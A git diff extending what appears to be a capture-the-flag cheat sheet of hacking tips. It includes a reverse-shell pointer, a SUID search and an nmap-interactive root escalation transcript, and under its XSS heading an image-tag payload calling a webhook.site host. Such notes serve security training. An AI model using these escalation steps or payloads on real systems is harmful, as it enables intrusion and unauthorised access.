@@ -6,7 +6,7 @@ classes: wide
 
 ---
 
-## SYSTEM HACKING
+# System Hacking
 
 * To discover the system in the network, use either Nmap or Netdiscover
 * To scan for vulnerabilities use nikto.
@@ -27,3 +27,63 @@ classes: wide
   * pentestmonkey.net/tools/web-shells/php-reverse-shell
 * Command to get Bash shell
   * `python -c "import pty;pty.spawn('/bin/bash')"`
+* Privilige Escalation: Now if we found the hash for the priviliged user, we can use crackstation.net/ to get the password.
+* To find all the files which current user can interact use the command
+  * `find / -perm -4000 2>/dev/null`
+* If there is any program which we can get to use as root, we need to target that.
+  ```robot@linux:/$ nmap --interactive
+  nmap --interactive
+  Starting nmap V. 3.81 ( www.insecure.org/nmap/ )
+  Welcome to Interactive Mode -- press h <enter> for help
+  nmap> !sh
+  !sh
+  # id
+  id
+  uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+  ```
+* If we got access to VIM (MAN Pages), we can run `!<Command>` to execute directly in the shell.
+* If we want to run old 16bit or 32bit windows program, we can use www.dosbox.com, an emulator which can be installed on Windows.
+
+# File Hacking
+* If something is hidden on a pdf which we need to find, we can Press Ctrl + A to copy everything on the pdf and paste on notepad.
+   * If nothing is found, we can use [Inkspace tool](https://inkscape.org) to paste the pdf and try to ungroup several times to extract any hidden flag.
+   * We can even solve using pdf-uncompress tools like qpdf to convert compressed data to redeable format and solve from there.
+* If there is `PK` at the start of the file in the magic bytes, its most probably `ZIP` File.
+* If there is recursive ZIP File, we can use the following command `binwalk -Me <FILE_NAME>`.
+* If EXE file is having some hidden text, we can use hexeditor or strings to locate the flag.
+* If hidden text has == at the end, it is base64 encoded.
+* We can use Strace to track all application calls.
+  * Command: `strace -s -f 12345 -e trace=recv,read <PROGRAM>`
+* We can use ltrace to track all app + library calls.
+  * Command: `ltrace ./<PROG_NAME>`
+
+# Crypto
+* If there is word `caesar` in the question or hint, this can be a substitution cipher.
+  * Use this website www.dcode.fr/caesar-cipher to Bruteforce the hidden message.
+
+# Forensics
+* If there is a image given, try `file` comamnd on the image to learn more information.
+* Binwalk to find data inside the image or sometimes if binwalk reports as zip Archive, we can rename the file to <FILE_NAME>.zip to find interesting data.
+   * Command `binwalk <IMAGE_NAME>`
+* If there is ntfs file,extract with 7Zip on Windowds. If there is a file with alternative data strems, we can use the command `dir /R <FILE_NAME>` and then we can this command to extract data inside it `cat <HIDDEN_STREAM> > asdf.<FILE_TYPE>`
+* Method to extract ntfs in Linux : `sudo mount -o loop <FILENAME.ntfs> mnt`
+
+# Password Cracking
+* If there is `JOHN` in the title/text/hint, its mostly reference to `JOHN the ripper` for bruteforce passwords/hashes.
+  * Command : `./john -show <PASS_FILE>`
+  
+# XSS Attack
+* If there is a website, with a text field to submit, we can try XSS Attack.
+  * Use any online HTTP Bin website like https://webhook.site/#!/
+  * ``` ""> <img src="https://webhook.site/19df1f1a-2ec8-453e-b85b-ed2cab66a5cc>"```
+  
+# Packet Capture
+* If usb keys are mapped with pcap, we can use this Article to extract usb keys entered: [Link](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)
+  * Example Command : `tskark.exe -r <FILE_NAME.pcapng> -Y "usb.transfer_types==1" -e "frame.time.epoch" -e "usb.capdata" -Tfields`
+
+# Tools
+* Total Commander - multi purpose terminal for Hacking. Link : www.ghisler.com
+* CTF Exploitation Framework : Github.com/Gallopsled/pwntools `pip install pwntools`
+* When using GDB, we can create "~/.gdbinit" file and add this line "set disassembly-flavor intel" to make intel synatx.
+* Dirbuster for enumeration web server Attacks.
+
